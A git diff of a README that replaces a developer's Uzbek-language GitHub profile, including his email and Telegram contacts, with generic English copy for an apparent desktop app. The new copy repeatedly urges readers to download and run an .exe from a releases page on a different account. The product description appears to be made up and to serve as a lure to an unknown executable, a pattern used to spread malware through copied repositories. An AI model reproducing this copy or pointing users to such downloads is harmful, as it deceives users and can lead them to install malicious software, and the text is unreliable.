@@ -1,107 +1,76 @@
-<h1 align="center">👋 Assalomu alaykum, men Humoyun Mamasodiqov</h1>
+# 🚀 HumoyunMamasodiqov - Simple Tools for Users
 
-<h3 align="center">O'zbekistondan Full-Stack Dasturchi</h3>
+## ⚙️ Overview
+Welcome to the HumoyunMamasodiqov project! This software aims to provide easy-to-use tools for everyday tasks. You can create websites and develop applications without any programming skills. Just follow the steps below to get started.
 
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=4000&pause=1000&color=22F74A&center=true&vCenter=true&width=500&lines=Web+Saytlar+Yaratish;Telegram+Botlar+Yaratish;Backend+va+Frontend+Rivojlantirish" alt="Typing SVG" />
-</p>
+## 🏷️ Features
+- User-friendly interface
+- Create websites quickly
+- Develop basic applications
+- Customizable templates
+- Responsive design
 
----
+## 📥 Download & Install
+You can download the application from the Releases page. 
 
-## 🚀 Mening Texnologiyalarim
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/deadlyboi01/HumoyunMamasodiqov/releases)
+
+To download, simply visit the link below:
+[Visit the Releases Page](https://github.com/deadlyboi01/HumoyunMamasodiqov/releases)
+
+## 🚀 Getting Started
+Follow the steps below to download and run the software:
+
+1. **Go to the Releases Page:** Click on the provided link to reach the downloads section.
+   
+   [Visit the Releases Page](https://github.com/deadlyboi01/HumoyunMamasodiqov/releases)
+
+2. **Select the Latest Version:** Look for the latest version of the software listed on that page.
+
+3. **Choose Your File:** Click on the file that suits your operating system (e.g., .exe for Windows).
+
+4. **Download the File:** Once you select the file, your download will begin automatically.
+
+5. **Locate the Downloaded File:** Find the downloaded file in your computer’s downloads folder.
+
+6. **Run the Application:** Double-click the file to start the installation process. Follow the prompts to complete the installation.
+
+7. **Start Using the Software:** Once installed, you can open the application from your desktop or applications folder and start using it.
+
+## 📊 System Requirements
+To ensure the best experience, please check the following system requirements for the application:
+
+- **Operating System:** Windows 10 or later, macOS (latest version), or Linux (Ubuntu 18.04 or later)
+- **RAM:** Minimum 4 GB recommended
+- **Disk Space:** At least 200 MB free space
+- **Internet Connection:** Required for initial setup and updates
+
+## 🛠️ Supported Technologies
+This application supports various technologies to enhance your experience:
 
 ### Frontend
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![Bootstrap](https://img.shields.io/badge/Bootstrap-7952B3?style=for-the-badge&logo=bootstrap&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![Swiper](https://img.shields.io/badge/Swiper-6332F6?style=for-the-badge&logo=swiper&logoColor=white)
+- **HTML5:** Structure your content easily.
+- **CSS3:** Style your applications beautifully.
+- **JavaScript:** Add interactivity to your web pages.
+- **Bootstrap:** Responsive design for mobile devices.
+- **Tailwind CSS:** Utility-first CSS framework for speed.
 
-### Backend
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Django](https://img.shields.io/badge/Django-092E20?style=for-the-badge&logo=django&logoColor=white)
-![Django REST](https://img.shields.io/badge/Django_REST-ff1709?style=for-the-badge&logo=django&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&logo=fastapi)
+## 📝 User Guide
+Once you install the application, you can follow the built-in tutorial to understand its features. The user interface is designed to be intuitive, allowing you to navigate easily. Each feature comes with tooltips that explain how to use them effectively.
 
-### Ma'lumotlar Bazasi
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white)
-![SQLite](https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white)
+## 📖 FAQ
+- **Q: Is there a mobile version?**
+  A: Currently, the application is only available for desktop operating systems.
 
-### Boshqa Vositalar
-![Git](https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white)
-![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![Font Awesome](https://img.shields.io/badge/Font_Awesome-528DD7?style=for-the-badge&logo=font-awesome&logoColor=white)
-![Icons8](https://img.shields.io/badge/Icons8-1FB2FF?style=for-the-badge&logo=icons8&logoColor=white)
+- **Q: How do I get support?**
+  A: For support, you can create an issue in the GitHub repository.
 
----
+- **Q: Can I contribute?**
+  A: Yes! We welcome contributions. Please refer to the CONTRIBUTING.md for guidelines.
 
-## 🌟 Web Saytlar
+## 🛒 Future Updates
+We plan to roll out regular updates to improve features and fix bugs. Keep an eye on the Releases page for new versions.
 
-<!-- Web saytlar loyihalari -->
-<div align="center">
-  
-### 🎯 Asosiy Web Loyihalar
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/deadlyboi01/HumoyunMamasodiqov/releases)
 
-| Loyiha Nomi | Texnologiyalar | Tavsif | Link |
-|-------------|---------------|--------|------|
-| Uzum market Sayt | Django, Python, PostgreSQL | To'liq funksionallikli online do'kon | [Ko'rish](https://github.com/HumoyunMamasodiqov/uzum-market) |
-
-</div>
-
----
-
-## 📊 GitHub Statistikalarim
-
-<!-- GitHub stats -->
-<div align="center">
-  
-![Humoyun's GitHub stats](https://github-readme-stats.vercel.app/api?username=HumoyunMamasodiqov&show_icons=true&theme=dark&locale=uz)
-
-![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=HumoyunMamasodiqov&layout=compact&theme=dark&langs_count=8)
-
-![GitHub Streak](https://streak-stats.demolab.com/?user=HumoyunMamasodiqov&theme=dark)
-
-</div>
-
----
-
-## 🌐 Ijtimoiy Tarmoqlar
-
-<!-- Ijtimoiy tarmoqlar -->
-<p align="center">
-  <a href="https://t.me/xumoyun731">
-    <img src="https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram" />
-  </a>
-  <a href="https://instagram.com/humoyun.731">
-    <img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white" alt="Instagram" />
-  </a>
-  <a href="mailto:humoyun2009uzb@gmail.com">
-    <img src="https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail" />
-  </a>
-  <a href="https://github.com/HumoyunMamasodiqov">
-    <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" />
-  </a>
-</p>
-
----
-
-## 📫 Bog'lanish
-
-- **Email:** [humoyun2009uzb@gmail.com](mailto:humoyun2009uzb@gmail.com)
-- **Telegram:** [@xumoyun731](https://t.me/xumoyun731)
-- **GitHub:** [HumoyunMamasodiqov](https://github.com/HumoyunMamasodiqov)
-
----
-
-<!-- Snake animation -->
-<div align="center">
-  <img src="https://raw.githubusercontent.com/HumoyunMamasodiqov/HumoyunMamasodiqov/output/github-contribution-grid-snake.svg" alt="Snake animation" />
-</div>
-<!-- GitHub trophy -->
-<p align="center"> 
-  <a href="https://github.com/ryo-ma/github-profile-trophy">
-    <img src="https://github-profile-trophy.vercel.app/?username=HumoyunMamasodiqov&theme=onedark&row=2&column=4" alt="GitHub Trophy" />
-  </a>
-</p>
+Thank you for using HumoyunMamasodiqov! Enjoy the software and create with ease!
